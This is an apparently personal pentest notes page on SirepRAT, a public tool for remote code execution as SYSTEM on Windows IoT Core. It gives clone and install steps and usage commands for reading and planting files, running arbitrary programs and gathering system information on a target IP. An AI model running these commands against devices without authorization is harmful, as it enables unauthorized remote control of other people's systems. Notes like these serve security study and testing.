---
title: SirepRAT - RCE as SYSTEM on Windows IoT Core
author: amandaguglieri
draft: true
tags:
  - windows
  - rce
---
# SirepRAT - RCE as SYSTEM on Windows IoT Core

**SirepRAT** Features full RAT capabilities without the need of writing a real RAT malware on target.

[https://github.com/SafeBreach-Labs/SirepRAT#context)](https://github.com/SafeBreach-Labs/SirepRAT#context)

## Installation

```bash
# Download the repository
git clone https://github.com/SafeBreach-Labs/SirepRAT.git

# Run the installation
pip install -r requirements.txt
```


## Basic usage

## Usage

```
# Download File bash
python SirepRAT.py $ip GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v

# Upload File
python SirepRAT.py $ip PutFileOnDevice --remote_path "C:\Windows\System32\uploaded.txt" --data "Hello IoT world!"

# Run Arbitrary Program
python SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname.exe"

# With arguments, impersonated as the currently logged on user:
python SirepRAT.py $ip LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"

# Try to run it without the as_logged_on_user flag to demonstrate the SYSTEM execution capability)
# Get System Information
python SirepRAT.py $ip GetSystemInformationFromDevice

```

#### [](https://github.com/SafeBreach-Labs/SirepRAT#get-file-information)Get File Information

```shell
python SirepRAT.py 192.168.3.17 GetFileInformationFromDevice --remote_path "C:\Windows\System32\ntoskrnl.exe"
```

#### [](https://github.com/SafeBreach-Labs/SirepRAT#see-help-for-full-details)See help for full details:

```shell
python SirepRAT.py --help
```

## [](https://github.com/SafeBreach-Labs/SirepRAT#author)Author

## Related Labs

